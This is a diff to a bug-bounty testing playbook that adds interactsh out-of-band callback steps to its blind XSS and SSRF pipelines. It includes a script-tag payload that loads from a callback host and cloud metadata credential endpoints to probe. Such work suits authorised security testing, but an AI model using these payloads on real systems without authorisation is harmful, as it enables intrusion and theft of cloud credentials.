@@ -75,8 +75,13 @@ uv run bba scan dalfox "<url>" --program <prog>
 # Step 2: If WAF detected or dalfox found nothing, try xsstrike with evasion
 uv run bba scan xsstrike "<url>" --program <prog>
 
-# Step 3: Blind XSS — if target has form inputs, try xsstrike --blind
+# Step 3: Blind XSS — generate interactsh callbacks for blind XSS detection
+uv run bba scan interactsh-generate --program <prog> --count 10
+# Use generated URLs as blind XSS payloads: <script src=//INTERACTSH_URL></script>
 uv run bba scan xsstrike "<url>" --program <prog> --blind
+
+# Step 3b: Poll for blind XSS callbacks after waiting (admin panels may take time)
+uv run bba scan interactsh-poll <session-file> --program <prog> --domain <target-domain>
 
 # Step 4: CRLF→XSS chain — test redirect params for CRLF that chains to XSS
 uv run bba scan crlfuzz "<url>" --program <prog>
@@ -114,14 +119,22 @@ uv run bba scan nosqli "<url>" --program <prog>
 ### SSRF Testing Pipeline
 
 **When:** gf_patterns returns ssrf URLs OR url/fetch/load/proxy parameters found
-**Tools:** qsreplace (payload injection) + manual curl verification
+**Tools:** interactsh (OOB detection) + qsreplace (payload injection) + manual curl verification
 **Priority:** HIGH — cloud metadata access can be critical
 
 ```bash
-# Step 1: Replace SSRF-candidate params with OOB callback URL
-uv run bba recon qsreplace "<urls-file>" --program <prog> --payload "https://CALLBACK_DOMAIN"
+# Step 0: Generate OOB callback URLs for blind SSRF detection
+uv run bba scan interactsh-generate --program <prog> --count 20
+# Save the session file path from the output for polling later
 
-# Step 2: Test cloud metadata endpoints manually via curl
+# Step 1: Replace SSRF-candidate params with OOB callback URL
+uv run bba recon qsreplace "<urls-file>" --program <prog> --payload "https://<interactsh-url>"
+
+# Step 2: After injecting payloads, poll for OOB interactions
+uv run bba scan interactsh-poll <session-file> --program <prog> --domain <target-domain>
+# Any DNS/HTTP callbacks confirm blind SSRF
+
+# Step 3: Test cloud metadata endpoints manually via curl
 # AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
 # GCP: http://metadata.google.internal/computeMetadata/v1/ (needs Metadata-Flavor: Google header)
 # Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (needs Metadata: true header)
